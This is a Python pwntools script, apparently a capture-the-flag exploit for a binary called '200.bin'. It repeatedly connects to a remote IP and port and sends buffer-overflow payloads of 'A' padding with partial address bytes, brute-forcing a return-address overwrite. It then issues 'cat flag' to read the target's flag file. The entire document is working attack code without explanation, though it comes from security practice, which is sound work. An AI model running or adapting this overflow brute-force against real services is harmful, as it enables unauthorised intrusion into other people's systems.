from pwn import *
from time import sleep

context.terminal = ['tmux', 'splitw', '-h']

for i in range(256):
    #  r = process('./200.bin')
    #  gdb.attach(r, '''
    #  c
    #  ''')
    r = remote('45.32.157.65', 65022)

    sleep(0.1)
    print r.recv()
    r.sendline('A'*40 + '\xca')
    sleep(0.1)
    print r.recv()
    r.sendline('A'*200 + '\x01\x49')
    try:
        r.sendline('cat flag\x00')
        sleep(0.5)
        print r.recv()
    except:
        print 'fail'

    r.close()
